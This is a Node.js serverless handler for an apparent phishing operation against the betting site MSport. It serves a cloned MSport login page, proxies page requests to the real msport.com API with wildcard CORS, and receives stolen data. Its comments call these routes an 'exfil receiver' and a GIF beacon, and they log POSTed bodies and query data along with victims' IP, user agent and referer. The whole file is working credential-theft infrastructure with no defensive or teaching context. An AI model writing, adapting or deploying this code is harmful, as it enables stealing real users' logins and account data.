const LOGIN_HTML = require('./login_html.js');
const https = require('https');
const { URL } = require('url');

function clientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  return xff ? String(xff).split(',')[0].trim() : (req.socket && req.socket.remoteAddress) || 'unknown';
}

// Forward a request to the real MSport API and stream the response back.
function proxy(req, res, targetUrl) {
  const u = new URL(targetUrl);
  const headers = Object.assign({}, req.headers);
  headers['host'] = u.host;
  delete headers['content-length'];
  delete headers['connection'];

  const upstream = https.request(
    { protocol: u.protocol, hostname: u.hostname, port: u.port || 443,
      method: req.method, path: u.pathname + u.search, headers },
    (pr) => {
      const out = Object.assign({}, pr.headers);
      out['access-control-allow-origin'] = '*';
      res.writeHead(pr.statusCode || 502, out);
      pr.pipe(res);
    }
  );
  upstream.on('error', (e) => res.status(502).json({ error: 'proxy_error', detail: String(e) }));
  req.pipe(upstream);
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(204).end();

  const parsed = new URL(req.url, 'http://localhost');
  const path = parsed.pathname || '';

  // ---- 1) MSport API proxy ----
  // Rewrite maps /api/:path* -> /api, so req.url keeps the original path.
  // Page requests /api/ng/patron/... -> forward to https://www.msport.com/api/ng/...
  if (path.startsWith('/api/ng/')) {
    const qs = new URLSearchParams(parsed.search);
    qs.delete('path');                       // drop Vercel's rewrite helper param
    const q = qs.toString();
    return proxy(req, res, 'https://www.msport.com' + path + (q ? '?' + q : ''));
  }

  // ---- 2) Exfil receiver (POST /api) ----
  if (req.method === 'POST') {
    let body = '';
    await new Promise((resolve) => {
      req.on('data', (c) => { body += c; if (body.length > 2e6) req.destroy(); });
      req.on('end', resolve);
      req.on('error', resolve);
    });
    let payload = body;
    if (payload.startsWith('d=')) { try { payload = decodeURIComponent(payload.slice(2)); } catch (e) {} }
    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], referer: req.headers['referer'] || '', body: payload };
    console.log('=== EXFIL HIT ===', JSON.stringify(hit));
    return res.status(200).json({ ok: true });
  }

  // ---- 3) 1x1 gif beacon ----
  if (parsed.searchParams.get('d')) {
    console.log('=== EXFIL BEACON ===', parsed.searchParams.get('d'));
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store');
    return res.status(200).send(gif);
  }

  // ---- 4) Serve the cloned MSport login page ----
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).send(LOGIN_HTML);
};
